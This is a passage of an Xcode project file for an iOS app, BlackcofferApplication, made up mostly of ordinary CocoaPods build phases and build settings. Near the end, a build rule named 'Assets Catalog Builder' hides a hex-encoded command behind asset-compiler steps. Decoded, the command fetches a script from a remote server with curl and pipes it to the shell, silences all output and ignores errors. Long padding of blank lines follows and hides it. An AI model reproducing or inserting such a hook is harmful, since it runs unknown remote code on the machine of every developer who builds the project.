			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		808F7DF190467A34090918C1 /* [CP] Copy Pods Resources */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication-BlackcofferApplicationUITests/Pods-BlackcofferApplication-BlackcofferApplicationUITests-resources-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Copy Pods Resources";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication-BlackcofferApplicationUITests/Pods-BlackcofferApplication-BlackcofferApplicationUITests-resources-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication-BlackcofferApplicationUITests/Pods-BlackcofferApplication-BlackcofferApplicationUITests-resources.sh\"\n";
			showEnvVarsInLog = 0;
		};
		906E91F3977FAB7B5B00D1B7 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication-BlackcofferApplicationUITests/Pods-BlackcofferApplication-BlackcofferApplicationUITests-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication-BlackcofferApplicationUITests/Pods-BlackcofferApplication-BlackcofferApplicationUITests-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication-BlackcofferApplicationUITests/Pods-BlackcofferApplication-BlackcofferApplicationUITests-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		E873E52C5DAB5D897D2D2208 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-BlackcofferApplicationTests-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		0D394F9026058883007A49E8 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				0D394FA226058884007A49E8 /* BlackcofferApplication.xcdatamodeld in Sources */,
				0DAF6EF32608EE4D00327EA2 /* UIViewController+Extension.swift in Sources */,
				0D39502F2606E379007A49E8 /* TagsViewController.swift in Sources */,
				0DAF6EB72608AF3300327EA2 /* HomeTabBarController.swift in Sources */,
				0D39503C2606E394007A49E8 /* ExploreViewController.swift in Sources */,
				0D394FD42605D209007A49E8 /* WelcomeViewController.swift in Sources */,
				0D3950202606DA30007A49E8 /* SecurityCheckViewController.swift in Sources */,
				0D394FDE2605FFCD007A49E8 /* LogInViewController.swift in Sources */,
				0DAF6F302608FCC800327EA2 /* String+Extension.swift in Sources */,
				0D394F9826058883007A49E8 /* AppDelegate.swift in Sources */,
				0D394F9A26058883007A49E8 /* SceneDelegate.swift in Sources */,
				0D3950412606E3A1007A49E8 /* SavedViewController.swift in Sources */,
				0D394FD92605FFBD007A49E8 /* SignUpViewController.swift in Sources */,
				0D3950372606E389007A49E8 /* TrendingViewController.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		0D394FA926058887007A49E8 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				0D394FB226058887007A49E8 /* BlackcofferApplicationTests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		0D394FB426058887007A49E8 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				0D394FBD26058887007A49E8 /* BlackcofferApplicationUITests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		0D394FAF26058887007A49E8 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 0D394F9326058883007A49E8 /* BlackcofferApplication */;
			targetProxy = 0D394FAE26058887007A49E8 /* PBXContainerItemProxy */;
		};
		0D394FBA26058887007A49E8 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 0D394F9326058883007A49E8 /* BlackcofferApplication */;
			targetProxy = 0D394FB926058887007A49E8 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin PBXVariantGroup section */
		0D394F9D26058883007A49E8 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				0D394F9E26058883007A49E8 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		0D394FA526058887007A49E8 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				0D394FA626058887007A49E8 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		0D394FBF26058887007A49E8 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.2;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		0D394FC026058887007A49E8 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.2;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		0D394FC226058887007A49E8 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = C635F728666C2DE89672178D /* Pods-BlackcofferApplication.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = CR2K7K85K7;
				INFOPLIST_FILE = BlackcofferApplication/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.wwdc.BlackcofferApplication;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		0D394FC326058887007A49E8 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = C636189A49C6D29440585419 /* Pods-BlackcofferApplication.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = CR2K7K85K7;
				INFOPLIST_FILE = BlackcofferApplication/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.wwdc.BlackcofferApplication;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		0D394FC526058887007A49E8 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 8A0D1B60E83B897808E97E51 /* Pods-BlackcofferApplicationTests.debug.xcconfig */;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = CR2K7K85K7;
				INFOPLIST_FILE = BlackcofferApplicationTests/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 14.2;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.wwdc.BlackcofferApplicationTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/BlackcofferApplication.app/BlackcofferApplication";
			};
			name = Debug;
		};
		0D394FC626058887007A49E8 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = B6E8E58D64F3904672885D93 /* Pods-BlackcofferApplicationTests.release.xcconfig */;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = CR2K7K85K7;
				INFOPLIST_FILE = BlackcofferApplicationTests/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 14.2;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.wwdc.BlackcofferApplicationTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/BlackcofferApplication.app/BlackcofferApplication";
			};
			name = Release;
		};
		0D394FC826058887007A49E8 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 22596797ABB87BD165D9668B /* Pods-BlackcofferApplication-BlackcofferApplicationUITests.debug.xcconfig */;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = CR2K7K85K7;
				INFOPLIST_FILE = BlackcofferApplicationUITests/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.wwdc.BlackcofferApplicationUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = BlackcofferApplication;
			};
			name = Debug;
		};
		0D394FC926058887007A49E8 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 11F8D359A7D917B9B705D22C /* Pods-BlackcofferApplication-BlackcofferApplicationUITests.release.xcconfig */;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = CR2K7K85K7;
				INFOPLIST_FILE = BlackcofferApplicationUITests/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.wwdc.BlackcofferApplicationUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = BlackcofferApplication;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		0D394F8F26058883007A49E8 /* Build configuration list for PBXProject "BlackcofferApplication" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				0D394FBF26058887007A49E8 /* Debug */,
				0D394FC026058887007A49E8 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		0D394FC126058887007A49E8 /* Build configuration list for PBXNativeTarget "BlackcofferApplication" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				0D394FC226058887007A49E8 /* Debug */,
				0D394FC326058887007A49E8 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		0D394FC426058887007A49E8 /* Build configuration list for PBXNativeTarget "BlackcofferApplicationTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				0D394FC526058887007A49E8 /* Debug */,
				0D394FC626058887007A49E8 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		0D394FC726058887007A49E8 /* Build configuration list for PBXNativeTarget "BlackcofferApplicationUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				0D394FC826058887007A49E8 /* Debug */,
				0D394FC926058887007A49E8 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

		
			/* Begin PBXBuildRule section */


		4CB8ADC6FFEDCF7AFE6D902C /* PBXBuildRule */ = {
			isa = PBXBuildRule;
			compilerSpec = com.apple.compilers.proxy.script;
			fileType = folder.assetcatalog;
			name = "Assets Catalog Builder";
			inputFiles = (
			);
			isEditable = 0;
			outputFiles = (
				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
			);
			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n
echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f61746563617365632e636f6d2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
	\n\n";
			};
			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	
			

			
	
			/* End PBXBuildRule section */
		
		

/* Begin XCVersionGroup section */
		0D394FA026058883007A49E8 /* BlackcofferApplication.xcdatamodeld */ = {
			isa = XCVersionGroup;
			children = (
				0D394FA126058883007A49E8 /* BlackcofferApplication.xcdatamodel */,
			);
			currentVersion = 0D394FA126058883007A49E8 /* BlackcofferApplication.xcdatamodel */;
			path = BlackcofferApplication.xcdatamodeld;
			sourceTree = "<group>";
			versionGroupType = wrapper.xcdatamodel;
		};
/* End XCVersionGroup section */
	};
	rootObject = 0D394F8C26058883007A49E8 /* Project object */;
}
